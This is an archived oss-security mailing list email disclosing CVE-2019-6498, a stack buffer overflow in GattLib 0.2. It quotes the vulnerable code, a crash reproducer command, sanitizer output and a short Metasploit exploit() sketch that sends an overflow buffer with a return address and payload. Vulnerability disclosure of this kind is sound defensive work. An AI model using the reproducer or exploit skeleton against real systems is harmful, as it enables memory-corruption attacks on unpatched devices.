X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4938" "Monday" "21" "January" "2019" "11:31:33" "+0400" "Dhiraj Mishra" "mishra.dhiraj95@gmail.com" "<CAG8b5tT07LGjr=kPWGNa7fWTnGSDak5iTULw-9mC13AwvRHySg@mail.gmail.com>" "156" "[oss-security] GattLib 0.2 has a stack-based buffer - CVE-2019-6498" "^Date:" nil nil "1" "2019012107:31:33" "[oss-security] GattLib 0.2 has a stack-based buffer - CVE-2019-6498" (number mark "U       mishra.dhira Jan 21  156/4938  " thread-indent "\"[oss-security] GattLib 0.2 has a stack-based buffer - CVE-2019-6498\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 16270 invoked by uid 550); 21 Jan 2019 09:27:42 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 9918 invoked from network); 21 Jan 2019 07:31:57 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=94BTRhZLWONe56sTGQrIXKhZUpPFt+1mNeFpg5WCuCQ=;
        b=AIOZXSEHCvYYPur9dNP1vkFFGDvLp+mQYceaLie9d15IOTjTN7r1pTqkws1DTIvC4T
         y79U1a2ED+zbkcFx1QKbnkA+YZcMH7i+KYcbeUJEoCBzRp7X+RwLgxwZsHo+fJKu2xJQ
         7TTxWU/viyDCqgWfBoeuCv0vOaIWT/OG5R/qJUlujj200RXZzNCTilBD7FHCIXkc7gaE
         pFpW0mSOYaqZHCKDHkV3x6a5V/m+xQmJbRd9nC+RLO1pdO0rF46pNeeVIljove8lxJ0O
         C/w9/I73SO5YtwjJtNQBH+4JS5YJe4skdtXYxt4Arq6BkDTK9qPKoijhS0yuHf7YgBgK
         7ixw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=94BTRhZLWONe56sTGQrIXKhZUpPFt+1mNeFpg5WCuCQ=;
        b=YCgIdWuaiYJbLE3uB+QbDov3JdpHm23XNJz5oJHG4GGxdAw414O7FDUY8PkGGOSz4G
         ybmHLSVqBPr5fBn7XjHFdrtu7kXnXjQhNw78IgyXNN3Op9A8BI/ZamzeLjGYWC9GqUK1
         RBqGo41RbL6xVXUgH+BJ/mQgaYjf4pUddTH5egSlTNH2TL8sfnfIMz5DmFTWBQ4+ivAg
         ZFZiopKC6XcU18TWrx9HnYOU4zUWvaeZzqVx9f8NuQZEFW56MpMxKSo/aQFmm1+EieHg
         qowCe5Aj8l59YAZLOqdNXEslzGU/ULAoS/YINYY1h7G0kGJeUl2qJJgzV5f1k0EP1d2G
         gTUQ==
X-Gm-Message-State: AJcUukdvc4+9Me63Ua3tA+qyv6to/MnykEWovK4zV9+EPXZJSiNkrA7d
	Zlg2Zqmn3NO7t7MSR1/iPDbgLyiFAQN1xTISHyIt/CPYnJQ=
X-Google-Smtp-Source: ALg8bN7L+09olN3mWMt7KPHLXwMilkSd1kioN19ZPpNCpu0ya/t2G8TNTZlkt2lujKfEnG8eZuzRsDAhzPZuneXnf/0=
X-Received: by 2002:a17:902:6113:: with SMTP id t19mr28227378plj.248.1548055904561;
 Sun, 20 Jan 2019 23:31:44 -0800 (PST)
MIME-Version: 1.0
Message-ID: <CAG8b5tT07LGjr=kPWGNa7fWTnGSDak5iTULw-9mC13AwvRHySg@mail.gmail.com>
Content-Type: multipart/alternative; boundary="00000000000048affd057ff2da59"
Date: Mon, 21 Jan 2019 11:31:33 +0400
From: Dhiraj Mishra <mishra.dhiraj95@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] GattLib 0.2 has a stack-based buffer - CVE-2019-6498
To: oss-security@lists.openwall.com

--00000000000048affd057ff2da59
Content-Type: text/plain; charset="UTF-8"

Hi List,

## Summary:
While fuzzing gattlib (Gattlib is a library to access GATT information from
BLE (Bluetooth Low Energy) devices) using clang 6.0 with ASAN a stack-based
buffer-overflow was observed.

## Vulnerable code from gattlib.c

// Transform string from 'DA:94:40:95:E0:87' to 'dev_DA_94_40_95_E0_87'
strncpy(device_address_str, dst, sizeof(device_address_str));
for (i = 0; i < strlen(device_address_str); i++) {
if (device_address_str[i] == ':') {
device_address_str[i] = '_';
}
}

## Vulnerable code from discover.c

if (argc != 2) {
printf("%s <device_address>\n", argv[0]);
return 1;
}

connection = gattlib_connect(NULL, argv[1], BDADDR_LE_PUBLIC, BT_SEC_LOW,
0, 0);
if (connection == NULL) {
fprintf(stderr, "Fail to connect to the bluetooth device.\n");
return 1;
}

Also, I have figured a simple way to reproduce this rather than using AFL
poc in this case.

./discover `python -c 'print "A"*20'`

## ASAN

==31499==ERROR: AddressSanitizer: stack-buffer-overflow on address
0x7ffc99cec2d4 at pc 0x00000044de04 bp 0x7ffc99cec270 sp 0x7ffc99ceba20
READ of size 21 at 0x7ffc99cec2d4 thread T0
    #0 0x44de03 in __interceptor_strlen.part.30
(/home/zero/gattlib/build/examples/discover/discover+0x44de03)
    #1 0x7f149e22069e in gattlib_connect
/home/zero/gattlib/dbus/gattlib.c:224:18
    #2 0x50bf48 in main
/home/zero/gattlib/examples/discover/discover.c:43:15
    #3 0x7f149c6d6b96 in __libc_start_main
/build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310
    #4 0x41c959 in _start
(/home/zero/gattlib/build/examples/discover/discover+0x41c959)

Address 0x7ffc99cec2d4 is located in stack of thread T0 at offset 84 in
frame
    #0 0x7f149e22056f in gattlib_connect
/home/zero/gattlib/dbus/gattlib.c:209

  This frame has 3 object(s):
    [32, 40) 'error'
    [64, 84) 'device_address_str' <== Memory access at offset 84 overflows
this variable
    [128, 228) 'object_path'
HINT: this may be a false positive if your program uses some custom stack
unwind mechanism or swapcontext
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow
(/home/zero/gattlib/build/examples/discover/discover+0x44de03) in
__interceptor_strlen.part.30
Shadow bytes around the buggy address:
  0x100013395800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100013395810: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100013395820: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100013395830: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100013395840: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x100013395850: f1 f1 f1 f1 00 f2 f2 f2 00 00[04]f2 f2 f2 f2 f2
  0x100013395860: 00 00 00 00 00 00 00 00 00 00 00 00 04 f3 f3 f3
  0x100013395870: f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00
  0x100013395880: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1
  0x100013395890: 00 f2 f2 f2 00 f2 f2 f2 04 f2 04 f2 00 00 00 00
  0x1000133958a0: 06 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==31499==ABORTING

I have also written a quick MSF module for this specifically the exploit()
part

I have also written a quick MSF module for this specifically the exploit()
part

def exploit
    connect

    print_status("Sending #{payload.encoded.length} byte payload...")

    # Building the buffer for transmission
    buf = "A" * 20
    buf += [ target.ret ].pack('V')
    buf += payload.encoded

    sock.put(buf)
    sock.get

    handler
end

In addition memory leak was also observed in this case.

==31544==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 16 byte(s) in 1 object(s) allocated from:
    #0 0x4d21b8 in calloc
(/home/zero/gattlib/build/examples/discover/discover+0x4d21b8)
    #1 0x7fe844ee2857 in gattlib_connect
/home/zero/gattlib/dbus/gattlib.c:233:36
    #2 0x50bf48 in main
/home/zero/gattlib/examples/discover/discover.c:43:15
    #3 0x7fe843398b96 in __libc_start_main
/build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310

SUMMARY: AddressSanitizer: 16 byte(s) leaked in 1 allocation(s).

OR to verify memory leak use,

./discover `python -c 'print "A"*10'`

Later CVE-2019-6498 was assigned to this issue.

Reference:
https://github.com/labapart/gattlib/issues/81


Thank you
@mishradhiraj_

--00000000000048affd057ff2da59--
